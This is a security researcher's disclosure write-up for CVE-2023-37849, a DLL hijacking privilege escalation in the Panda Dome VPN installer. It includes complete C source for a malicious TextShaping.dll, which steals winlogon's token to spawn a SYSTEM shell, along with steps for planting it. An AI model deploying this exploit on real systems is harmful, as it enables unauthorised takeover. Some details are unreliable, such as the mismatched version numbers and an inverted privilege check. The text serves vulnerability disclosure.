---
title : "CVE-2023-37849: Local privilege escalation in Panda Dome VPN for Windows Installer"
excerpt: "CVE-2023-37849"

categories:
    - "0-day"
tags:
    - [Panda Security, 0-day, CVE, EoP, Mitre, LPE]
---


## 0x01: Details

- Title: Local privilege escalation in Panda Dome VPN for Windows Installer
- CVE ID: CVE-2023-37849
- Advisory Published: 2023/07/05
- Advisory URL : [https://www.pandasecurity.com/en/support/card?id=100080](https://www.pandasecurity.com/en/support/card?id=100080)
- CVSS : 6.5 MEDIUM(CVSS Version 3.x)

## 0x02: Test Environment

Panda Dome Version : 21.01.00

OS : Windows 10 Pro 64-bit 21H2 (build 19044.1826)

## 0x03: Vulnerability details

Vulnerability that allows a local attacker to gain SYSTEM privileges by exploiting administrator privileges, and that enables the server thread to perform actions on behalf of the client, but within the limits of the client's security context.

## 0x04: Technical description

Many DLLs are loaded from the directory where the Panda Security VPN installer file PANDAVPN.exe is located. If these DLLs are not in the directory, DLLs are loaded from the `C:\Windows\SysWOW64` directory. Among these Dlls, `TextShaping.dll` is loaded, and this DLL load is done with Administrator privileges. So, by placing `TextShaping.dll` in the directory where the Panda Security VPN installer file is located, you can gain SYSTEM privileges by abusing Administrator privileges.

## 0x05: Proof-of-Concept (PoC)

```c
#include <stdio.h>
#include <windows.h>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <sddl.h>

#pragma comment (lib,"advapi32.lib")

int exploit() {
	DWORD lpidProcess[2048], lpcbNeeded, cProcesses;
	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	int processWinlogonPid;

	if (Process32First(hSnapshot, &p32)) {
		do {
			if (wcscmp(p32.szExeFile, L"winlogon.exe") == 0) {
				printf("[+] Located winlogon.exe by process name (PID %d)\n", p32.th32ProcessID);
				processWinlogonPid = p32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &p32));

		CloseHandle(hSnapshot);
	}

	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());

	if (currentProc) {
		HANDLE TokenHandle = NULL;
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken) {
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

			if (!checkToken) {
				printf("[+] Current process token already includes SeDebugPrivilege\n");
			}
			else {
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0) {
					printf("[+] Added SeDebugPrivilege to the current process token\n");
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);

	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	BOOL OpenToken;
	BOOL Impersonate;
	BOOL Duplicate;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);

	if (!hProcess) {
		printf("[-] Failed to obtain a HANDLE to the target PID\n");
		return -1;
	}

	printf("[+] Obtained a HANDLE to the target PID\n");

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);

	if (!OpenToken) {
		printf("[-] Failed to obtain a HANDLE to the target TOKEN %d\n", GetLastError());
	}

	printf("[+] Obtained a HANDLE to the target TOKEN\n");

	Impersonate = ImpersonateLoggedOnUser(TokenHandle);

	if (!Impersonate) {
		printf("[-] Failed to impersonate the TOKEN's user\n");
		return -1;
	}

	printf("[+] Impersonated the TOKEN's user\n");

	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);

	if (!Duplicate) {
		printf("[-] Failed to duplicate the target TOKEN\n");
		return -1;
	}

	printf("[+] Duplicated the target TOKEN\n");

	BOOL NewProcess;

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);

	NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

	if (!NewProcess) {
		printf("[-] Failed to create a SYSTEM process\n");
		return -1;
	}

	printf("[+] Created a SYSTEM process\n");

	CloseHandle(NewToken);
	CloseHandle(hProcess);
	CloseHandle(TokenHandle);

	return 0;
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH: {
			exploit();
			exit(-1);
            break;
        }

        case DLL_THREAD_ATTACH: {
            break;
        }

        case DLL_THREAD_DETACH: {
            break;
        }

        case DLL_PROCESS_DETACH: {
            break;
        }
    }
    return TRUE;
}
```

1. Use Visual Studio 2019.
2. Compile the project in the DLL directory in x86 Release mode.
3. Rename the compiled dll to `TextShaping.dll` and place it in the same directory as PANDAVPN.exe.
4. Run `PANDAVPN.exe` to perform Panda Security VPN installation.

## 0x06: Affected Products

This vulnerability affects the following product:

- Panda Security VPN Version < 15.14.8

## 0x07: Credit information

HeeChan Kim (@heegong123) of TeamH4C

## 0x08: TimeLine

- 2022/08/01 : First time contacted via Panda Security Email(secure@pandasecurity.com).
- 2022/08/10 : I recevied a file which is patched via Panda Security.
- 2023/07/05 : The vulnerability has been patched, and I have been notified that the vulnerability has been disclosed.
- 2023/07/09 : Request a CVE id via MITRE.
- 2023/07/13 : Received a call from MITRE for CVE-2023-37849.

## 0x09: Reference

- [https://www.pandasecurity.com/en/homeusers/vpn/](https://www.pandasecurity.com/en/homeusers/vpn/)
- [https://www.pandasecurity.com/en/support/card?id=100080](https://www.pandasecurity.com/en/support/card?id=100080)
- [https://nvd.nist.gov/vuln/detail/CVE-2023-37849](https://nvd.nist.gov/vuln/detail/CVE-2023-37849)